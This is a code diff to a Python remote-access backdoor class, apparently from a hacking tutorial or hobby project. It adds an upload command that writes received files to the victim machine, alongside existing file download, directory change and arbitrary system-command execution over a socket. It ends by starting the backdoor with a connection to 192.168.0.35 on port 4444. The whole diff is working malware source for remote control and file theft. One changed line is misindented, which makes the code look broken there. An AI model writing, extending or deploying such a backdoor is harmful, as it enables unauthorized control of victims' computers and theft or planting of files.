@@ -35,6 +35,11 @@ class Backdoor:
         with open(path, "rb") as file:
             return file.read()
 
+    def write_file(self, path, contents):
+        with open(path, "wb") as file:
+            file.write(contents)
+        return '[+] Upload successful'
+
     def send_file(self, file_content):
         self.connection.sendall(file_content)
         self.connection.sendall(b"DONE")
@@ -47,14 +52,26 @@ class Backdoor:
                 self.connection.close()
                 exit()
             elif command[0] == "cd" and len(command) > 1:
-                command_result = self.change_working_directory_to(command[1])
-                self.reliable_send(command_result)
+               command_result = self.change_working_directory_to(command[1])
+                # self.reliable_send(command_result)
             elif command[0] == "download":
                 file_content = self.read_file(command[1])
-                self.send_file(file_content)  #
+                self.send_file(file_content)
+            elif command[0] == 'upload':
+                file_path = command[1]
+                # Receive the file content
+                file_content = b''
+                while True:
+                    chunk = self.connection.recv(1024)
+                    if chunk.endswith(b"DONE"):
+                        file_content += chunk[:-4]  # Exclude the 'DONE' marker
+                        break
+                    file_content += chunk
+                self.write_file(file_path, file_content)
+                command_result = "[+] Upload successful"
             else:
                 command_result = self.execute_system_command(command)
-                self.reliable_send(command_result)
+            self.reliable_send(command_result)
 
 my_backdoor = Backdoor("192.168.0.35", 4444)
 my_backdoor.run()
